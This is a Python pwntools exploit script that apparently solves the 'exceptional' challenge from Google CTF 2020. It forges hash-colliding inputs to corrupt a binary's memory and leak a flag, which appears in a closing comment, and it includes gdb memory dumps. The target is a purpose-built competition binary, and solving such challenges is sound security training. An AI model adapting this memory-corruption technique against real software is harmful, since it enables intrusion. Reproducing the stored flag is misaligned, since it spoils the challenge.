#!/usr/bin/env python3
from pwn import *


def hash_name(name):
    if isinstance(name, str):
        name = name.encode()
    result = 0x12345678
    while len(name) >= 4:
        result ^= struct.unpack('<I', name[:4])[0]
        name = name[4:]
    assert len(name) == 0
    return result


def force_hash(name, value):
    name = bytearray(name)
    xormagic, = struct.unpack('<I', name[0:4])
    xormagic ^= hash_name(name) ^ value
    name[0:4] = struct.pack('<I', xormagic)
    return bytes(name)


def has_space(x):
    return b' ' in x or b'\r' in x or b'\n' in x or b'\t' in x or b'\x0b' in x or b'\x0c' in x


class City:
    def __init__(self, name, delta):
        self.name = name
        self.name_hash = hash_name(self.name)
        self.delta = delta


def main():
    if args.LOCAL:
        tube = gdb.debug(['./exceptional.dbg'], gdbscript='''
set pagination off
b printf_current_time_in_var3
#watch *(long*)&cities[97]
#watch *((long*)&cities[97] + 1)
c
''')
    else:
        tube = remote('exceptional.2020.ctfcompetition.com', 1337)
    with tube:
        r = random.Random(667)
        cities = []
        i = 0
        while len(cities) < 100:
            name = force_hash(''.join(
                [r.choice(string.ascii_letters) for _ in range(44)]).encode(), i)
            if not has_space(name):
                cities.append(City(name, i % 24))
            i += 1
        assert cities[0].name_hash == 0
        cities = cities[1:] + cities[:1]

        victim_city = 0x461
        stray_city = 51
        flag_city = 0xc4
        # prepare for corruption
        # we will end up in cmp_var0_eq_hash with
        # var0 == hash(other_name)
        # var1 == cities[stray_city].name[8:12]
        stray_name = bytearray(cities[stray_city].name)
        stray_name[4:16] = struct.pack('<III', victim_city, flag_city, flag_city)
        cities[stray_city].name = force_hash(stray_name, cities[stray_city].name_hash)
        assert cities[stray_city].name[4:16] == struct.pack('<III', victim_city, flag_city, flag_city)
        assert not has_space(cities[stray_city].name)
        assert hash_name(cities[stray_city].name) == cities[stray_city].name_hash

        # create a degenerate tree, which is really a list
        # two things:
        # 1) force small hashes. they must be smaller than city offsets
        # 2) put 0 at the end, so that we can jump on it immediately after it's
        # corrupted
        for i, city in enumerate(cities):
            print(f'# {i} {city.name}=0x{city.name_hash:x} {city.delta}')
            tube.sendline('1')
            tube.send(city.name)
            tube.send(' ')
            tube.sendline(str(city.delta))

        # corrupt list tail by colliding stack with city array
        magic = struct.pack('<I', 0x12345678 ^ victim_city)
        assert hash_name(magic) == victim_city
        tube.sendline('3')
        tube.recvuntil(b'Type your city and current time')
        tube.send(cities[0].name)
        tube.sendline(' 04:20')
        tube.sendline(magic)

        # cities[96] is intact

        # (gdb) x/16bx &cities[97]
        # 0x5632d6c59e10:	0x1c	0x07	0x00	0x00	0x61	0x06	0x00	0x00
        # 0x5632d6c59e18:	0x0c	0x07	0x00	0x00	0x61	0x06	0x00	0x00

        # (gdb) x/16bx (long)&var0 + 0x661 * 4
        # 0x55a7716e6aa4:	0x61	0x06	0x00	0x00	0xc4	0x00	0x00	0x00
        # 0x55a7716e6aac:	0xc4	0x00	0x00	0x00	0x59	0x6d	0x71	0x6b

        # (gdb) x/24bx (long)&var0 + 0xc4 * 4
        # 0x55a7716e5430:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
        # 0x55a7716e5438:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
        # 0x55a7716e5440:	0x43	0x54	0x46	0x7b	0x48	0x4f	0x4f	0x59

        magic = struct.pack('<I', 0x12345678)
        assert hash_name(magic) == 0
        tube.sendline('3')
        tube.recvuntil(b'Type your city and current time')
        tube.send(cities[0].name)
        tube.sendline(' 04:20')
        tube.sendline(magic)

        tube.interactive()  # CTF{3xcepti0n_or1ent3d_pr0gramm1ng_r0x!}


if __name__ == '__main__':
    main()
